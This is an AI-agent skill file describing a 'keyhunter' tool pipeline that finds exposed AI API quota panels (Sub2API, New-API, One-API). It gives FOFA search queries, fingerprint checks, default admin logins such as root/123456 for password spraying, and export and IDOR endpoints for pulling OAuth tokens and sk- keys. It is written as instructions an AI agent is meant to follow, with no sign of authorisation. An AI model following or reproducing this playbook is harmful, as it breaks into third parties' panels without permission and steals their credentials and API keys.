---
name: keyhunter
description: Operator playbook for the keyHunter CLI — FOFA discovery, product fingerprinting, weak-credential panel login, account export and artifact normalization for exposed AI quota panels (Sub2API, New-API, One-API). Use when running or extending the keyhunter pipeline.
---

# keyHunter operator playbook

Self-contained workflow implemented by the `keyhunter` CLI in this repo.

> **Loading this skill**: install it by symlinking or copying this file into your tool's skills directory — e.g. `~/.claude/skills/keyhunter/SKILL.md` (Claude Code personal) or `~/.codex/skills/keyhunter/SKILL.md` (Codex). The CLI itself installs with `pip install -e .`; see README.md (Chinese) for the full agent-integration guide.

```text
discover → fingerprint → spray → export → normalize → (optional) validate
```

## Progress checklist

```text
- [ ] Discovery queries executed
- [ ] Targets fingerprinted
- [ ] Weak-login sessions obtained
- [ ] Raw exports written
- [ ] Artifacts normalized + deduped
- [ ] High-value sessions flagged
```

## Phase 1 — Discover

Default Sub2API FOFA queries (also in `keyhunter/products.py`):

```text
body="sub2api" && port="8080"
body="sub2api" || title="Sub2API"
title="Sub2API" && port="8080"
```

```bash
keyhunter discover --product sub2api --out results/hits.json
```

Needs `FOFA_KEY` in `.env`. Details: [docs/reference-fofa.md](docs/reference-fofa.md)

## Phase 2 — Fingerprint

Confirm Sub2API before login:

| Check | Signal |
|-------|--------|
| Title / body | `Sub2API` / `sub2api` |
| Login route | `POST /api/v1/auth/login` exists |
| Port | often `8080` |

```bash
keyhunter fingerprint --in results/hits.json --out results/alive.json
```

## Phase 3 — Spray (admin login)

```http
POST /api/v1/auth/login
{"email":"...","password":"..."}
```

Email order (exhaust passwords for #1 first):

1. `admin@sub2api.local`
2. `admin@example.com`
3. `admin@sub2api.com`
4. `admin@localhost`
5. `test@sub2api.local`

Password shortlist: see `keyhunter/data/passwords_sub2api.txt`

```bash
keyhunter spray --in results/alive.json --out results/sessions.json
```

## Phase 4 — Export

```http
GET /api/v1/admin/accounts/data?platform=openai&type=oauth&include_proxies=false
Authorization: Bearer <access_token>
```

```bash
keyhunter export --in results/sessions.json --out results/exports
```

API map: [docs/reference-sub2api.md](docs/reference-sub2api.md)

## Phase 5 — Normalize

CPA / Codex / Sub2API shapes: [docs/reference-artifact-formats.md](docs/reference-artifact-formats.md)

```bash
keyhunter normalize --in results/exports --out results/artifacts
```

## Phase 6 — Validate (optional)

JWT `exp` check + refresh_token presence. No bulk chat calls.

```bash
keyhunter validate --in results/artifacts --out results/valid.json
```

## One-shot

```bash
keyhunter hunt --product sub2api --out results/run1
keyhunter hunt --product newapi --out results/newapi1
keyhunter hunt --product oneapi --url http://HOST:3000 --out results/one
```

## Products beyond Sub2API

### New-API (`--product newapi`)

- FOFA: `body="new-api" && body="sk-"`, `body="new-api" && body="token"`
- Fingerprint: `GET /api/status`, `GET /v1/models`
- Login: `POST /api/user/login` (`username`/`password`); extras include `root/123456`, `admin/123456`
- Passwords: `keyhunter/data/passwords_newapi.txt` + shared `keyhunter/data/weak_passwords.txt`
- Export: `GET /api/token/`, also `/api/channel/`, `/api/user/self`
- IDOR: `GET /api/token/{id}`
- Normalize: `sk-` / `sk-proj-` → `artifacts/keys/`

Details: [docs/reference-newapi.md](docs/reference-newapi.md)

### One-API (`--product oneapi`)

Same login/token family; separate FOFA queries (`one-api` / `oneapi`).

### Shared weak dictionary

`keyhunter/data/weak_passwords.txt` (~489) is merged into every product password list via `ProductProfile.passwords()`.

## Operating rules

1. Fingerprint before spray.
2. Sub2API: exhaust `admin@sub2api.local` passwords first; New-API: try `root`/`admin` extras first.
3. Write secrets under `--out`; CLI summaries only.
4. Keep dicts / queries in-repo (`keyhunter/data/`, `keyhunter/products.py`).
